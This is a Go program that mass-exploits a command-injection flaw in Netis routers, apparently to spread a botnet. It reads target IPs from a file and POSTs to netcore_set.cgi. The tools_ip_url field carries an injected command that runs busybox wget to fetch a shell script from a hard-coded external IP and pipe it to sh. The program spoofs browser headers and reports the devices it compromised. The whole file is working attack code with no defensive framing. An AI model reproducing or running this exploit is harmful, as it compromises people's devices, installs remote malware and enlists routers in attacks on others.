package main

import (
    "fmt"
    "io/ioutil"
    "net"
    "net/http"
    "strings"
    "sync"
    "time"
    "crypto/tls"
)

func main() {
    ipsFile, err := ioutil.ReadFile("ips.txt")
    if err != nil {
        fmt.Println("Error reading ips.txt:", err)
        return
    }

    ipLines := strings.Split(string(ipsFile), "\n")

    transport := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, 
    }

    client := &http.Client{
        Transport: transport,
        Timeout:   10 * time.Second, 
    }

    requestBody := []byte("mode_name=netcore_set&tools_type=2&tools_ip_url=1.1.1.1%3Bcd%20%2Ftmp%3Bbusybox%20wget%20http%3A%2F%2F95.214.27.10%2Fn3881.sh%20-O-%7Csh&tools_cmd=1&net_tools_set=1&wlan_idx_num=0")

    contentLength := fmt.Sprintf("%d", len(requestBody))

    maxConcurrency := 40
    concurrencySemaphore := make(chan struct{}, maxConcurrency)

    var wg sync.WaitGroup

    for _, ipLine := range ipLines {
        ipPort := strings.TrimSpace(ipLine)
        if ipPort == "" {
            continue 
        }

        concurrencySemaphore <- struct{}{}

        wg.Add(1)
        go func(ipPort string) {
            defer func() {

                <-concurrencySemaphore
                wg.Done()
            }()

            url := fmt.Sprintf("http://%s/cgi-bin-igd/netcore_set.cgi", ipPort)

            req, err := http.NewRequest("POST", url, strings.NewReader(string(requestBody)))
            if err != nil {
                fmt.Printf("Error creating request for %s: %v\n", ipPort, err)
                return
            }

            req.Header.Set("Content-Length", contentLength)
            req.Header.Set("Cache-Control", "no-cache")
            req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36")
            req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
            req.Header.Set("Accept", "*/*")
            req.Header.Set("Origin", fmt.Sprintf("http://%s", ipPort))
            req.Header.Set("Referer", fmt.Sprintf("http://%s/index.htm", ipPort))
            req.Header.Set("Accept-Encoding", "gzip, deflate, br")
            req.Header.Set("Accept-Language", "en-US,en;q=0.9")
            req.Close = true 

            resp, err := client.Do(req)
            if err != nil {
                // Check for a timeout error
                if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
                    //fmt.Printf("Request to %s timed out\n", ipPort)
                } else {
                    //fmt.Printf("Error sending request to %s: %v\n", ipPort, err)
                }
                return
            }
            defer resp.Body.Close()

            responseBody, err := ioutil.ReadAll(resp.Body)
            if err != nil {
                //fmt.Printf("Error reading response body from %s: %v\n", ipPort, err)
                return
            }


            if strings.Contains(string(responseBody), `["SUCCESS"]`) {
                fmt.Printf("[netis] device identified: %s \n", ipPort)
            } else {
                //fmt.Printf("Request to %s failed!\n", ipPort)
            }
        }(ipPort)
    }


    wg.Wait()
}
